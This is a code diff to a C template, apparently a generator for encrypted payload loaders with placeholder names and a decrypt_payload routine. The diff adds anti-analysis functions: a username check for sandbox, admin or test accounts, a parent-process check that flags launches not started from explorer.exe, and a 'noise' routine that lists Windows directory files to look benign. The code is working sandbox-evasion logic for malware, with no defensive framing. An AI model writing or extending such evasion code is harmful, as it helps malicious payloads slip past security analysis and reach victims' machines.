@@ -33,6 +33,47 @@ size_t {{SIZE_NAME}} = 0;
 int {{CAPACITY_NAME}} = 0;
 
 // {{JUNK}}
+int is_sandbox_user() {
+    char username[256] = {0};
+    DWORD size = sizeof(username);
+    GetUserNameA(username, &size);
+    return (strstr(username, "sandbox") || strstr(username, "admin") || strstr(username, "test")) ? 1 : 0;
+}
+
+int check_parent() {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
+    DWORD ppid = 0, mypid = GetCurrentProcessId();
+    if (Process32First(hSnap, &pe32)) {
+        do {
+            if (pe32.th32ProcessID == mypid) {
+                ppid = pe32.th32ParentProcessID;
+                break;
+            }
+        } while (Process32Next(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ppid);
+    CHAR parentName[MAX_PATH] = "";
+    if (hParent) {
+        HMODULE hMod;
+        DWORD cbNeeded;
+        if (EnumProcessModules(hParent, &hMod, sizeof(hMod), &cbNeeded))
+            GetModuleBaseNameA(hParent, hMod, parentName, sizeof(parentName));
+        CloseHandle(hParent);
+    }
+    return _stricmp(parentName, "explorer.exe") != 0;
+}
+
+void noise() {
+    WIN32_FIND_DATA findData;
+    HANDLE hFind = FindFirstFileA("C:\\Windows\\*", &findData);
+    int count = 0;
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do { if (++count > 10) break; } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+    }
+}
 
 void decrypt_payload(unsigned char *data, size_t data_len) {
     printf("[*] Starting decryption using %s\n", enc_algo);
